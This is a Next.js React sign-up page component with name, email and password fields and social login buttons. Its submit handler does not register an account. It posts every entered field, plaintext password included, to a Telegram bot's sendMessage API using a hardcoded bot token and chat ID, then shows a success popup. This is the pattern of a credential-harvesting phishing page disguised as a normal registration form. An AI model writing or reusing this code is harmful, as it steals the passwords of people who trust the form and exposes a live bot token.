import Image from "next/image";
import { Button } from "react-bootstrap";
import Link from "next/link";
import { useState } from "react";
import axios from "axios";
import PopupModal from "./components/Items/PopupModal";

const SignUp = () => {
  const [name, setName] = useState("");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [repeatPassword, setRepeatPassword] = useState("");
  const [modalShow, setModalShow] = useState(false);

  console.log(name, email, password, repeatPassword);

  const handleSubmit = (event) => {
    event.preventDefault();

    // Create message object
    const message = {
      name,
      email,
      password,
      repeatPassword,
    };

    // Make API request to Telegram API
    axios
      .post(
        "https://api.telegram.org/bot6096642912:AAEpKhYnHkg7qwp9Sc1z7thQkDYWFBrlO38/sendMessage",
        {
          chat_id: 5816284266,
          text: JSON.stringify(message),
        }
      )
      .then((response) => {
        console.log("API request successful:", response);
        setModalShow(true);
        // Handle success (e.g., show a success message)
      })
      .catch((error) => {
        console.error("API request error:", error);
        // Handle error (e.g., show an error message)
      });

    setName("");
    setEmail("");
    setPassword("");
    setRepeatPassword("");
  };

  return (
    <div
      className="container d-flex flex-column align-items-center"
      id="login-page"
    >
      <Link href="/" id="arrow-back">
        <Image
          src="/images/arrowback.png"
          alt="images"
          width={40}
          height={35}
        />
        <span>Back</span>
      </Link>
      <div
        className="text-light d-flex flex-column justify-content-center align-items-center gap-3"
        id="login-container"
      >
        <h5>Create Your Account</h5>
        <div className="d-flex gap-3">
          <a href="facebook.com">
            <Image
              src="/images/Facebook.png"
              alt="images"
              width={100}
              height={30}
            />
          </a>
          <a href="twitter.com">
            <Image
              src="/images/Twitter.png"
              alt="images"
              width={100}
              height={30}
            />
          </a>
          <a href="google.com">
            <Image
              src="/images/Google.png"
              alt="images"
              width={100}
              height={30}
            />
          </a>
        </div>
        <h6>Or Register with email</h6>
        <input
          type="text"
          placeholder="Name"
          id="form-login"
          value={name}
          onChange={(event) => setName(event.target.value)}
        ></input>
        <input
          type="email"
          placeholder="Email"
          id="form-login"
          value={email}
          onChange={(event) => setEmail(event.target.value)}
        ></input>
        <div className="d-flex" id="div-form-signup">
          <input
            type="password"
            placeholder="Password"
            id="form-signup"
            value={password}
            onChange={(event) => setPassword(event.target.value)}
          ></input>
          <input
            type="password"
            placeholder="Repeat Password"
            id="form-signup"
            value={repeatPassword}
            onChange={(event) => setRepeatPassword(event.target.value)}
          ></input>
        </div>
        <div className="d-flex justify-content-between" id="login-check">
          <span>
            <input type="checkbox"></input> <label>Remember Me</label>
          </span>
          <a href="#" className="">
            Forgot Password
          </a>
        </div>
        {name && email && password && repeatPassword ? (
          <Button variant="warning" className="mt-2" onClick={handleSubmit}>
            CONTINUE
          </Button>
        ) : (
          <Button variant="warning" className="mt-2">
            CONTINUE
          </Button>
        )}
      </div>
      <PopupModal show={modalShow} onHide={() => setModalShow(false)} />
      <img src="/images/logoSmall.png" alt="logo" id="decoration" />
    </div>
  );
};

export default SignUp;
